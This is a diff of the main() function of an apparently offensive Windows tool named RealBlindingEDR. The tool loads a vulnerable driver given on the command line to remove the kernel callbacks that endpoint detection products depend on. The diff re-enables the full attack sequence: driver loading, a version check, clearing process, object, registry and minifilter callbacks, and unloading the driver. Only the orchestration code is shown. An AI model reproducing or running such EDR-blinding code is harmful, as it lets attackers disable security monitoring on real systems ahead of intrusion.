@@ -1017,36 +1017,36 @@ int main(int argc, char* argv[])
 	printf(" _| |  \\ \\| \\__.// | |,| | _| |__) | | | | | | | | \\__/  | | | | | | |\\ \\._/_| |__/ |_| |_.' _| |  \\ \\_  \n");
 	printf("|____| |___'.__.\\'-;__[___|_______[___[___[___||__'.__.;__[___[___||__.',__|________|______.|____| |___| \n");
 	printf("                                                                     ( ( __))                            \n");
-	//if (argc != 3) {
-	//	printf("Usage: RealBlindingEDR.exe [driver_path] [driver_type]\n\neg: RealBlindingEDR.exe c:\\echo_driver.sys 1\n");
-	//	return 0;
-	//}
-	//DrivePath = argv[1];
-	//Driver_Type = atoi(argv[2]);
-
 	LaunchCalcIndependent();
-	system("pause");
-	//GenerateRandomName();
-	//HINSTANCE hinst = LoadLibraryA("ntdll.dll");
-	//if (hinst == NULL) return FALSE;
-	//NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
-	//proc(&dwMajor, &dwMinorVersion, &dwBuild);
-	//dwBuild &= 0xffff;
-	//if (dwMajor < 10 && Driver_Type == 1) {
-	//	printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
-	//	return 0;
-	//}
-	//else {
-	//	printf("Windows version: %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
-	//}
-	//if (!InitialDriver()) return 0;
+	if (argc != 3) {
+		printf("Usage: RealBlindingEDR.exe [driver_path] [driver_type]\n\neg: RealBlindingEDR.exe c:\\echo_driver.sys 1\n");
+		return 0;
+	}
+	DrivePath = argv[1];
+	Driver_Type = atoi(argv[2]);
 
-	//ClearThreeCallBack();
-	//ClearObRegisterCallbacks();
-	//ClearCmRegisterCallback();
-	//ClearMiniFilterCallback();
-	//
-	//UnloadDrive();
-	//system("pause");
+	
+	GenerateRandomName();
+	HINSTANCE hinst = LoadLibraryA("ntdll.dll");
+	if (hinst == NULL) return FALSE;
+	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
+	proc(&dwMajor, &dwMinorVersion, &dwBuild);
+	dwBuild &= 0xffff;
+	if (dwMajor < 10 && Driver_Type == 1) {
+		printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+		return 0;
+	}
+	else {
+		printf("Windows version: %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+	}
+	if (!InitialDriver()) return 0;
+
+	ClearThreeCallBack();
+	ClearObRegisterCallbacks();
+	ClearCmRegisterCallback();
+	ClearMiniFilterCallback();
+	
+	UnloadDrive();
+	system("pause");
 }
 
